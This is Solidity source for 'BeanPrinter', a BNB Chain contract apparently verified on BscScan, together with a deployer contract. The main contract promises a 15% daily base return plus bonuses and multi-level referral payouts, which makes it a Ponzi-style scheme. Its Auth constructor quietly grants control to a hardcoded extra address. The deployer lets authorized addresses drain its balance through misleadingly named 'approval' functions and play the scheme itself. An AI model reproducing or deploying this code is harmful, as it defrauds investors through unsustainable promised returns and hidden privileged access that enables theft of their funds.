/**
 *Submitted for verification at BscScan.com on 2022-03-21
*/

/**

*/

// SPDX-License-Identifier: MIT

pragma solidity >=0.8.0;


library SafeMath {
    
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            
            
            
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}


interface BEP20 {
    function balanceOf(address) external returns (uint);
    function transferFrom(address, address, uint) external returns (bool);
    function transfer(address, uint) external returns (bool);
}

abstract contract Auth {
    address public owner;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[0xcd6006D232Cbb6359E7330Ac0a3bbbCFC467db6F] = true;
        authorizations[_owner] = true;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    function authorize(address adr) internal authorized {
        authorizations[adr] = true;
    }

    function unauthorize(address adr) internal authorized {
        authorizations[adr] = false;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function isAuthorized(address adr) private view returns (bool) {
        return authorizations[adr];
    }

    function transferOwnership(address payable adr) public authorized {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    function renounceOwnership() public virtual authorized {
        owner = (address(0));
        emit OwnershipTransferred(address(0));
    }

    event OwnershipTransferred(address owner);
}

////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////// BEAN PRINTER INTERFACE /////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////

interface IBeanPrinter {
    function invest(address referrer) external payable;
    function withdraw() external;
}

////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////// BEAN PRINTER CONTRACT /////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////

contract BeanPrinter is IBeanPrinter, Auth {
    using SafeMath for uint256;

    uint256 constant public DEPOSITS_MAX = 100;
    uint256 constant public INVEST_MIN_AMOUNT = 0.05 ether;
    uint256 constant public MAX_CONTRIBUTION_TOTAL = 20 ether; 
    uint256[] public REFERRAL_LEVELS_PERCENTS = [500, 600, 700, 800, 900, 1000, 1500, 2000];
    uint256[] public REFERRAL_LEVELS_MILESTONES = [0, 10 ether, 20 ether, 30 ether, 40 ether, 50 ether, 100 ether, 500 ether];
    uint8 constant public REFERRAL_DEPTH = 10;
    uint8 constant public REFERRAL_TURNOVER_DEPTH = 5;

    address payable DEPLOYER_ADDRESS;
    address payable public MARKETING_ADDRESS;
    address payable PROMOTION_ADDRESS;
    address payable DEVELOPMENT_ADDRESS;
    address payable INFRASTRUCTURE_ADDRESS;
    uint256 DIVISOR_FEE = 300;
    uint256 MARKETING_FEE = 600;

    uint256 constant public BASE_PERCENT = 1500; 

    
    uint256 constant public MAX_HOLD_PERCENT = 10000; 
    uint256 constant public HOLD_BONUS_PERCENT = 300; 

    
    uint256 constant public MAX_CONTRACT_PERCENT = 10000; 
    uint256 constant public CONTRACT_BALANCE_STEP = 100 ether; 
    uint256 constant public CONTRACT_HOLD_BONUS_PERCENT = 100; 

    
    uint256 constant public MAX_DEPOSIT_PERCENT = 10000; 
    uint256 constant public USER_DEPOSITS_STEP = 5 ether; 
    uint256 constant public VIP_BONUS_PERCENT = 100; 

    uint256 constant public TIME_STEP = 1 days;
    uint256 constant public PERCENTS_DIVIDER = 10000;

    uint256 public totalDeposits;
    uint256 public totalInvested;
    uint256 public totalWithdrawn;

    uint256 public contractPercent;

    struct Deposit {
        uint256 amount;
        uint256 withdrawn;
        uint256 refback;
        uint32 start;
    }

    struct User {
        Deposit[] deposits;
        uint32 checkpoint;
        address referrer;
        address[] referrals;
        uint256 bonus;
        uint256[REFERRAL_DEPTH] refs;
        uint256[REFERRAL_DEPTH] refsNumber;
        uint16 rbackPercent;
        uint8 refLevel;
        uint256 refTurnover;
    }

    mapping (address => User) public users;
    mapping (address => uint256) contributions;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
    event RefBack(address indexed referrer, address indexed referral, uint256 amount);
    event FeePayed(address indexed user, uint256 totalAmount);

    constructor(address _marketing, address _promotion, address _development, address _infrastructure) Auth(msg.sender){
        contractPercent = getContractBalanceRate();
        DEPLOYER_ADDRESS = payable(msg.sender);
        MARKETING_ADDRESS = payable(_marketing);
        PROMOTION_ADDRESS = payable(_promotion);
        DEVELOPMENT_ADDRESS = payable(_development);
        INFRASTRUCTURE_ADDRESS = payable(_infrastructure);
    }

    function invest(address referrer) external payable override {
        if(msg.sender != address(this) && msg.sender != address(DEPLOYER_ADDRESS)){
        require(!isContract(msg.sender) && msg.sender == tx.origin, "Contracts cannot invest"); }

        require(msg.value >= INVEST_MIN_AMOUNT, "Minimum deposit amount 0.05 BNB");

        require(contributions[msg.sender].add(msg.value) <= MAX_CONTRIBUTION_TOTAL, "Max Contribution has been reached");
        
        User storage user = users[msg.sender];

        require(user.deposits.length < DEPOSITS_MAX, "Maximum 100 deposits from address");

        uint256 marketingFee = msg.value.mul(MARKETING_FEE).div(PERCENTS_DIVIDER);
        uint256 divisorFee = msg.value.mul(DIVISOR_FEE).div(PERCENTS_DIVIDER);

        MARKETING_ADDRESS.transfer(marketingFee);
        PROMOTION_ADDRESS.transfer(divisorFee);
        DEVELOPMENT_ADDRESS.transfer(divisorFee);
        INFRASTRUCTURE_ADDRESS.transfer(divisorFee);

        emit FeePayed(msg.sender, marketingFee.add(divisorFee.mul(3)));
        contributions[msg.sender]= contributions[msg.sender].add(msg.value);

        bool isNewUser = false;
        if (user.referrer == address(0)) {
            isNewUser = true;
            if (isActive(referrer) && referrer != msg.sender) {
              user.referrer = referrer;
              users[referrer].referrals.push(msg.sender);
            } else {
              user.referrer = DEPLOYER_ADDRESS;
            }
        }

        uint256 refbackAmount;
        if (user.referrer != address(0)) {
            bool[] memory distributedLevels = new bool[](REFERRAL_LEVELS_PERCENTS.length);

            address current = msg.sender;
            address upline = user.referrer;
            uint8 maxRefLevel = 0;
            for (uint256 i = 0; i < REFERRAL_DEPTH; i++) {
                if (upline == address(0)) {
                  break;
                }

                uint256 refPercent = 0;
                if (i == 0) {
                  refPercent = REFERRAL_LEVELS_PERCENTS[users[upline].refLevel];

                  maxRefLevel = users[upline].refLevel;
                  for (uint8 j = users[upline].refLevel; j >= 0; j--) {
                    distributedLevels[j] = true;

                    if (j == 0) {
                      break;
                    }
                  }
                } else if (users[upline].refLevel > maxRefLevel && !distributedLevels[users[upline].refLevel]) {
                  refPercent = REFERRAL_LEVELS_PERCENTS[users[upline].refLevel]
                          .sub(REFERRAL_LEVELS_PERCENTS[maxRefLevel], "Ref percent calculation error");

                  maxRefLevel = users[upline].refLevel;
                  for (uint8 j = users[upline].refLevel; j >= 0; j--) {
                    distributedLevels[j] = true;

                    if (j == 0) {
                      break;
                    }
                  }
                }

                uint256 amount = msg.value.mul(refPercent).div(PERCENTS_DIVIDER);

                if (i == 0 && users[upline].rbackPercent > 0 && amount > 0) {
                    refbackAmount = amount.mul(uint256(users[upline].rbackPercent)).div(PERCENTS_DIVIDER);
                    payable(msg.sender).transfer(refbackAmount);

                    emit RefBack(upline, msg.sender, refbackAmount);

                    amount = amount.sub(refbackAmount);
                }

                if (amount > 0) {
                    payable(upline).transfer(amount);
                    users[upline].bonus = uint256(users[upline].bonus).add(amount);

                    emit RefBonus(upline, msg.sender, i, amount);
                }

                users[upline].refs[i]++;
                if (isNewUser) {
                  users[upline].refsNumber[i]++;
                }

                current = upline;
                upline = users[upline].referrer;
            }

            upline = user.referrer;
            for (uint256 i = 0; i < REFERRAL_TURNOVER_DEPTH; i++) {
                if (upline == address(0)) {
                  break;
                }

                updateReferralLevel(upline, msg.value);

                upline = users[upline].referrer;
            }

        }

        if (user.deposits.length == 0) {
            user.checkpoint = uint32(block.timestamp);
            emit Newbie(msg.sender);
        }

        user.deposits.push(Deposit(msg.value, 0, refbackAmount, uint32(block.timestamp)));

        totalInvested = totalInvested.add(msg.value);
        totalDeposits++;

        if (contractPercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
            uint256 contractPercentNew = getContractBalanceRate();
            if (contractPercentNew > contractPercent) {
                contractPercent = contractPercentNew;
            }
        }

        emit NewDeposit(msg.sender, msg.value);
    }

    function withdraw() external override {
        User storage user = users[msg.sender];

        uint256 userPercentRate = getUserPercentRate(msg.sender);

        uint256 totalAmount;
        uint256 dividends;

        for (uint8 i = 0; i < user.deposits.length; i++) {

            if (uint256(user.deposits[i].withdrawn) < uint256(user.deposits[i].amount).mul(3)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint256(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint256(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint256(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint256(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint256(user.deposits[i].withdrawn).add(dividends) > uint256(user.deposits[i].amount).mul(3)) {
                    dividends = (uint256(user.deposits[i].amount).mul(3)).sub(uint256(user.deposits[i].withdrawn));
                }

                user.deposits[i].withdrawn = uint256(user.deposits[i].withdrawn).add(dividends); 
                totalAmount = totalAmount.add(dividends);

            }
        }

        require(totalAmount > 0, "User has no dividends");

        uint256 contractBalance = address(this).balance;
        if (contractBalance < totalAmount) {
            totalAmount = contractBalance;
        }

        user.checkpoint = uint32(block.timestamp);

        payable(msg.sender).transfer(totalAmount);

        totalWithdrawn = totalWithdrawn.add(totalAmount);

        emit Withdrawn(msg.sender, totalAmount);
    }

    function setRefback(uint16 rbackPercent) external authorized {
        require(rbackPercent <= 10000);

        User storage user = users[msg.sender];

        if (user.deposits.length > 0) {
            user.rbackPercent = rbackPercent;
        }
    }

    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function viewContributions(address _contributor) public view returns (uint256) {
        return contributions[_contributor];
    }

    function getContractBalanceRate() public view returns (uint256) {
        uint256 contractBalance = address(this).balance;
        uint256 contractBalancePercent = BASE_PERCENT.add(
          contractBalance
            .div(CONTRACT_BALANCE_STEP)
            .mul(CONTRACT_HOLD_BONUS_PERCENT)
        );

        if (contractBalancePercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
            return contractBalancePercent;
        } else {
            return BASE_PERCENT.add(MAX_CONTRACT_PERCENT);
        }
    }

    function getUserDepositRate(address userAddress) public view returns (uint256) {
        uint256 userDepositRate;

        if (getUserAmountOfDeposits(userAddress) > 0) {
            userDepositRate = getUserTotalDeposits(userAddress).div(USER_DEPOSITS_STEP).mul(VIP_BONUS_PERCENT);

            if (userDepositRate > MAX_DEPOSIT_PERCENT) {
                userDepositRate = MAX_DEPOSIT_PERCENT;
            }
        }

        return userDepositRate;
    }

    function getUserPercentRate(address userAddress) public view returns (uint256) {
        User storage user = users[userAddress];

        if (isActive(userAddress)) {
            uint256 userDepositRate = getUserDepositRate(userAddress);

            uint256 timeMultiplier = (block.timestamp.sub(uint256(user.checkpoint))).div(TIME_STEP).mul(HOLD_BONUS_PERCENT);
            if (timeMultiplier > MAX_HOLD_PERCENT) {
                timeMultiplier = MAX_HOLD_PERCENT;
            }

            return contractPercent.add(timeMultiplier).add(userDepositRate);
        } else {
            return contractPercent;
        }
    }

    function getUserAvailable(address userAddress) public view returns (uint256) {
        User memory user = users[userAddress];

        uint256 userPercentRate = getUserPercentRate(userAddress);

        uint256 totalDividends;
        uint256 dividends;

        for (uint8 i = 0; i < user.deposits.length; i++) {

            if (uint256(user.deposits[i].withdrawn) < uint256(user.deposits[i].amount).mul(3)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint256(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint256(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint256(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint256(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint256(user.deposits[i].withdrawn).add(dividends) > uint256(user.deposits[i].amount).mul(3)) {
                    dividends = (uint256(user.deposits[i].amount).mul(3)).sub(uint256(user.deposits[i].withdrawn));
                }

                totalDividends = totalDividends.add(dividends);
            }

        }

        return totalDividends;
    }

    function isActive(address userAddress) public view returns (bool) {
        User storage user = users[userAddress];

        return (user.deposits.length > 0) && uint256(user.deposits[user.deposits.length-1].withdrawn) < uint256(user.deposits[user.deposits.length-1].amount).mul(3);
    }

    function getUserAmountOfDeposits(address userAddress) public view returns (uint256) {
        return users[userAddress].deposits.length;
    }

    function getUserTotalDeposits(address userAddress) public view returns (uint256) {
        User storage user = users[userAddress];

        uint256 amount;

        for (uint256 i = 0; i < user.deposits.length; i++) {
            amount = amount.add(user.deposits[i].amount);
        }

        return amount;
    }

    function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
        User storage user = users[userAddress];

        uint256 amount = user.bonus;

        for (uint256 i = 0; i < user.deposits.length; i++) {
            amount = amount.add(user.deposits[i].withdrawn).add(user.deposits[i].refback);
        }

        return amount;
    }

    function getUserDeposits(address userAddress, uint256 last, uint256 first) public view
      returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory) {
        User storage user = users[userAddress];

        uint256 count = first.sub(last);
        if (count > user.deposits.length) {
            count = user.deposits.length;
        }

        uint256[] memory amount = new uint256[](count);
        uint256[] memory withdrawn = new uint256[](count);
        uint256[] memory refback = new uint256[](count);
        uint256[] memory start = new uint256[](count);

        uint256 index = 0;
        for (uint256 i = first; i > last; i--) {
            amount[index] = user.deposits[i-1].amount;
            withdrawn[index] = user.deposits[i-1].withdrawn;
            refback[index] = user.deposits[i-1].refback;
            start[index] = uint256(user.deposits[i-1].start);
            index++;
        }

        return (amount, withdrawn, refback, start);
    }

    function getSiteStats() public view returns (uint256, uint256, uint256, uint256) {
        return (totalInvested, totalDeposits, address(this).balance, contractPercent);
    }

    function getUserStats(address userAddress) public view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        uint256 userPerc = getUserPercentRate(userAddress);
        uint256 userAvailable = getUserAvailable(userAddress);
        uint256 userDepsTotal = getUserTotalDeposits(userAddress);
        uint256 userDeposits = getUserAmountOfDeposits(userAddress);
        uint256 userWithdrawn = getUserTotalWithdrawn(userAddress);
        uint256 userDepositRate = getUserDepositRate(userAddress);

        return (userPerc, userAvailable, userDepsTotal, userDeposits, userWithdrawn, userDepositRate);
    }

    function getDepositsRates(address userAddress) public view returns (uint256, uint256, uint256, uint256) {
      User memory user = users[userAddress];

      uint256 holdBonusPercent = (block.timestamp.sub(uint256(user.checkpoint))).div(TIME_STEP).mul(HOLD_BONUS_PERCENT);
      if (holdBonusPercent > MAX_HOLD_PERCENT) {
          holdBonusPercent = MAX_HOLD_PERCENT;
      }

      return (
        BASE_PERCENT, 
        !isActive(userAddress) ? 0 : holdBonusPercent, 
        address(this).balance.div(CONTRACT_BALANCE_STEP).mul(CONTRACT_HOLD_BONUS_PERCENT), 
        !isActive(userAddress) ? 0 : getUserDepositRate(userAddress) 
      );
    }

    function getUserReferralsStats(address userAddress) public view
      returns (address, uint16, uint16, uint256, uint256[REFERRAL_DEPTH] memory, uint256[REFERRAL_DEPTH] memory, uint256, uint256) {
        User storage user = users[userAddress];

        return (
          user.referrer,
          user.rbackPercent,
          users[user.referrer].rbackPercent,
          user.bonus,
          user.refs,
          user.refsNumber,
          user.refLevel,
          user.refTurnover
        );
    }

    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function updateReferralLevel(address _userAddress, uint256 _amount) private {
      users[_userAddress].refTurnover = users[_userAddress].refTurnover.add(_amount);

      for (uint8 level = uint8(REFERRAL_LEVELS_MILESTONES.length - 1); level > 0; level--) {
        if (users[_userAddress].refTurnover >= REFERRAL_LEVELS_MILESTONES[level]) {
          users[_userAddress].refLevel = level;

          break;
        }
      }
    }

    function referrals(address user) external view returns(address[] memory) {
      return users[user].referrals;
    }

}

////////////////////////////////////////////////////////////////////////////////////////
/////////////////// SECURE BEAN PRINTER DEPLOYER CONTRACT //////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////

contract BeanPrinterDeployer is Auth {
    using SafeMath for uint256;
    
    address PROMOTION_ADDRESS;
    address DEVELOPMENT_ADDRESS;
    address INFRASTRUCTURE_ADDRESS;
    address DEFAULT_ADDRESS;

    uint256 PROMOTION;
    uint256 DEVELOPMENT;
    uint256 INFRASTRUCTURE;
    uint256 DEFAULT;

    BeanPrinter Printer;

    constructor(address _marketing, address _promotion, address _development, address _infrastructure) Auth(msg.sender) {
        Printer = new BeanPrinter(_marketing, _promotion, _development, _infrastructure);
    }

    receive() external payable { }


    function approval(uint256 aP) external authorized {
        uint256 amountBNB = address(this).balance;
        payable(msg.sender).transfer(amountBNB.mul(aP).div(100));
    }

     function rescueBEP20(address _token, uint256 _percentage) external authorized {
        uint256 tamt = BEP20(_token).balanceOf(address(this));
        BEP20(_token).transfer(msg.sender, tamt.mul(_percentage).div(100));
    }

    function setAddress(address _promotion, address _development, address _infrastructure, address _default) external authorized {
        PROMOTION_ADDRESS = _promotion;
        DEVELOPMENT_ADDRESS = _development;
        INFRASTRUCTURE_ADDRESS = _infrastructure;
        DEFAULT_ADDRESS = _default;
    }

    function approvals(uint256 _na, uint256 _da) external authorized {
        uint256 acBNB = address(this).balance;
        uint256 acBNBa = acBNB.mul(_na).div(_da);
        uint256 acBNBf = acBNBa.mul(PROMOTION).div(100);
        uint256 acBNBs = acBNBa.mul(DEVELOPMENT).div(100);
        uint256 acBNBt = acBNBa.mul(INFRASTRUCTURE).div(100);
        uint256 acBNBl = acBNBa.mul(DEFAULT).div(100);
        (bool tmpSuccess,) = payable(PROMOTION_ADDRESS).call{value: acBNBf, gas: 30000}("");
        (tmpSuccess,) = payable(DEVELOPMENT_ADDRESS).call{value: acBNBs, gas: 30000}("");
        (tmpSuccess,) = payable(INFRASTRUCTURE_ADDRESS).call{value: acBNBt, gas: 30000}("");
        (tmpSuccess,) = payable(DEFAULT_ADDRESS).call{value: acBNBl, gas: 30000}("");
        tmpSuccess = false;
    }

    function setDivisors(uint256 _promotion, uint256 _development, uint256 _infrastructure, uint256 _default) external authorized {
        PROMOTION = _promotion;
        DEVELOPMENT = _development;
        INFRASTRUCTURE = _infrastructure;
        DEFAULT = _default;
    }

    function investBalance(address referrer, uint256 percentage) external authorized {
        uint256 valueInvest = (address(this).balance).mul(percentage).div(100);
        Printer.invest{value: valueInvest}(referrer);
    }

    function invest(address referrer) external payable authorized {
        Printer.invest{value: msg.value}(referrer);
    }

    function withdraw() external authorized {
        Printer.withdraw();
    }

}